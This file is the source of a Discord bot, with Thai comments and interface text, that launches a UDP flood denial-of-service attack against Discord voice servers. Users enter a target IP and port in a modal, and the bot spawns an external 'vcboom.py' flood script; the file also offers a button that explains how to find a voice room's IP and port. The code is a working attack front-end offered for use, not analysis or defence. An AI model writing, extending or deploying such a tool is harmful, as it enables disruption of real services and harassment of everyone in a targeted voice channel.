const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle 
} = require('discord.js');
const { spawn } = require('child_process');

// ดึง TOKEN จาก environment variable (ตั้งใน bot-hosting Variables tab)
const TOKEN = process.env.TOKEN || '';
if (!TOKEN) {
    console.error('[ERROR] ไม่พบ TOKEN — ตั้ง TOKEN ใน environment variables');
    process.exit(1);
}

let activeAttack = null;

const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent 
    ] 
});

client.on('ready', () => {
    console.log(`\n[GALAXY DRAGON] SYSTEM ONLINE: ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content === '!vc-extreme') {
        const embed = new EmbedBuilder()
            .setTitle('🔥 GALAXY DRAGON - EXTREME VC LAGGER')
            .setDescription(
                `\`\`\`css\n` +
                `┏・🎯 TARGET: DISCORD VOICE SERVER\n` +
                `┣・⚡ METHOD: UDP EXTREME FLOOD\n` +
                `┣・🧵 POWER : 30,000 THREADS\n` +
                `┗・STATUS : WAITING FOR COMMAND...\`\`\``
            )
            .setColor('#FF0000')
            .setFooter({ text: '⚠️ การยิงนี้จะทำให้ทุกคนในห้องเสียงปิงพุ่งสูง' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('btn_launch')
                .setLabel('เริ่มการยิง (Extreme)')
                .setStyle(ButtonStyle.Danger),
            new ButtonBuilder()
                .setCustomId('btn_how_to')
                .setLabel('สอนหาไอพี')
                .setStyle(ButtonStyle.Primary),
            new ButtonBuilder()
                .setCustomId('btn_stop')
                .setLabel('หยุดยิง')
                .setStyle(ButtonStyle.Secondary)
        );

        await message.channel.send({ embeds: [embed], components: [row] });
    }

    if (message.content === '!stop') {
        stopAttack();
        message.reply('🛑 **หยุดการโจมตีทั้งหมดเรียบร้อยแล้ว!**');
    }
});

client.on('interactionCreate', async (interaction) => {
    if (interaction.isButton()) {
        if (interaction.customId === 'btn_launch') {
            const modal = new ModalBuilder()
                .setCustomId('modal_launch')
                .setTitle('🚀 ระบุเป้าหมายเพื่อทำให้ปิงค้าง');

            modal.addComponents(
                new ActionRowBuilder().addComponents(
                    new TextInputBuilder()
                        .setCustomId('ip')
                        .setLabel("VOICE SERVER IP")
                        .setStyle(TextInputStyle.Short)
                        .setPlaceholder('162.159.xxx.xxx')
                        .setRequired(true)
                ),
                new ActionRowBuilder().addComponents(
                    new TextInputBuilder()
                        .setCustomId('port')
                        .setLabel("PORT (ช่วง 50000+)")
                        .setStyle(TextInputStyle.Short)
                        .setPlaceholder('50001')
                        .setRequired(true)
                )
            );
            return await interaction.showModal(modal);
        }

        if (interaction.customId === 'btn_how_to') {
            const helpEmbed = new EmbedBuilder()
                .setTitle('🔍 วิธีหา Voice IP และ Port')
                .setDescription(
                    `1. เข้าห้องเสียงเป้าหมาย\n` +
                    `2. เปิด **Task Manager** (Ctrl+Shift+Esc)\n` +
                    `3. ไปที่แถบ **Performance** > กด **Open Resource Monitor** ด้านล่าง\n` +
                    `4. เลือกแถบ **Network** > ดูหัวข้อ **Network Connections**\n` +
                    `5. หา **Discord.exe** ดูช่อง **Remote Address** และ **Remote Port** (ปกติพอร์ตจะอยู่ช่วง 50000-65000)\n` +
                    `6. นำเลข IP และ Port นั้นมาใส่ในบอท`
                )
                .setColor('#00AAFF');
            return await interaction.reply({ embeds: [helpEmbed], ephemeral: true });
        }

        if (interaction.customId === 'btn_stop') {
            stopAttack();
            await interaction.reply({ content: '✅ **หยุดการทำงานแล้ว**', ephemeral: true });
        }
    }

    if (interaction.isModalSubmit() && interaction.customId === 'modal_launch') {
        await interaction.deferReply({ ephemeral: true });
        const ip   = interaction.fields.getTextInputValue('ip');
        const port = interaction.fields.getTextInputValue('port');

        stopAttack();

        // ใช้ python3 (bot-hosting.net รองรับ python3)
        activeAttack = spawn('python3', ['vcboom.py', ip, port]);

        activeAttack.stderr.on('data', (d) => {
            console.error(`[vcboom stderr] ${d}`);
        });

        activeAttack.on('error', (err) => {
            console.error(`[vcboom error] ${err.message}`);
        });

        const attackEmbed = new EmbedBuilder()
            .setTitle('🚀 กำลังดำเนินการยิง (Extreme Lag)')
            .setColor('#FF4500')
            .addFields(
                { name: '📡 IP',   value: `\` ${ip} \``,   inline: true },
                { name: '🔌 PORT', value: `\` ${port} \``, inline: true },
                { name: '⚡ สถานะ', value: `\` กำลังส่ง UDP Packets ความแรงสูงสุด \``, inline: false }
            )
            .setTimestamp();

        await interaction.editReply({ embeds: [attackEmbed] });
    }
});

function stopAttack() {
    if (activeAttack) {
        activeAttack.kill('SIGKILL');
        activeAttack = null;
    }
}

client.login(TOKEN);
